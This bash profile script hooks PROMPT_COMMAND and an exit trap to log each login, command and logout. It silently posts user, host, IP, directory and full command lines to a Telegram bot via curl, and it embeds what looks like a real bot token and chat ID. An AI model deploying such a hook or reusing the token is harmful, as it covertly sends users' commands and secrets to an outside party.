TELEGRAM_BOT_TOKEN="8764450785:AAHgufM9iacj5N3i3xBRLhtMmoR4ll7ed5g"
TELEGRAM_CHAT_ID="-1003801563204"
TELEGRAM_ENABLED=true

LOG_DIR="$HOME/.logs"
ACTIVITY_LOG="$LOG_DIR/all_activity.log"
SESSION_LOG="$LOG_DIR/session_$(date +%Y%m%d_%H%M%S).log"

[ ! -d "$LOG_DIR" ] && mkdir -p "$LOG_DIR" 2>/dev/null

send_telegram() {
    local message="$1"
    [ "$TELEGRAM_ENABLED" != "true" ] && return 0

    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -H "Content-Type: application/json" \
        -d "{\"chat_id\":\"$TELEGRAM_CHAT_ID\",\"text\":\"$message\",\"parse_mode\":\"HTML\"}" \
        > /dev/null 2>&1
}

track_login() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local user=$(whoami)
    local host=$(hostname)
    local ip=$(who am i 2>/dev/null | awk '{print $NF}' | tr -d '()' || echo "local")
    local session_type="LOCAL"
    [ -n "$SSH_CONNECTION" ] && session_type="SSH"

    echo "[$timestamp] 🔐 LOGIN - User:$user Host:$host IP:$ip Type:$session_type" >> "$ACTIVITY_LOG" 2>/dev/null

    local msg="<b>🔐 LOGIN DETECTED</b>\nUser: <code>$user</code>\nHost: <code>$host</code>\nIP: <code>$ip</code>\nType: <b>$session_type</b>\nTime: <code>$timestamp</code>"
    send_telegram "$msg" 2>/dev/null
}

track_command() {
    local exit_code=$?
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local user=$(whoami)
    local pwd=$(pwd 2>/dev/null || echo "unknown")
    local cmd=$(history 1 2>/dev/null | sed 's/^[ ]*[0-9]*[ ]*//')

    [ -z "$cmd" ] && return 0

    echo "[$timestamp] 💻 CMD - User:$user PWD:$pwd CMD:$cmd Exit:$exit_code" >> "$ACTIVITY_LOG" 2>/dev/null
    echo "[$timestamp] CMD: $cmd (exit: $exit_code)" >> "$SESSION_LOG" 2>/dev/null

    # Notifikasi untuk command penting
    local important_cmds=("nano" "vim" "vi" "rm" "mv" "cp" "sudo" "apt" "yum" "pip" "python" "bash" "sh" "systemctl" "service" "reboot" "shutdown")
    local send_notif=false

    for important in "${important_cmds[@]}"; do
        if [[ "$cmd" == "$important"* ]] || [[ "$cmd" == *"$important"* ]]; then
            send_notif=true
            break
        fi
    done

    if [ "$user" = "root" ] || [ "$send_notif" = true ] || [ "$exit_code" -ne 0 ]; then
        local status="✅ SUCCESS"
        [ "$exit_code" -ne 0 ] && status="❌ ERROR (exit: $exit_code)"

        local msg="<b>💻 COMMAND</b>\nUser: <code>$user</code>\nPWD: <code>$pwd</code>\nCMD: <code>$cmd</code>\nStatus: $status\nTime: <code>$timestamp</code>"
        send_telegram "$msg" 2>/dev/null
    fi
}

track_logout() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local user=$(whoami)
    local cmd_count=$(grep -c "CMD:" "$SESSION_LOG" 2>/dev/null || echo 0)

    echo "[$timestamp] 🚪 LOGOUT - User:$user Commands:$cmd_count" >> "$ACTIVITY_LOG" 2>/dev/null
    echo "LOGOUT: $timestamp - Total Commands: $cmd_count" >> "$SESSION_LOG" 2>/dev/null

    local msg="<b>🚪 LOGOUT</b>\nUser: <code>$user</code>\nCommands: <code>$cmd_count</code>\nTime: <code>$timestamp</code>"
    send_telegram "$msg" 2>/dev/null
}

# ----- SETUP -----
set -o history 2>/dev/null
HISTFILE=~/.bash_history 2>/dev/null
HISTSIZE=1000 2>/dev/null
HISTFILESIZE=2000 2>/dev/null

PROMPT_COMMAND="track_command"
trap track_logout EXIT 2>/dev/null
track_login 2>/dev/null
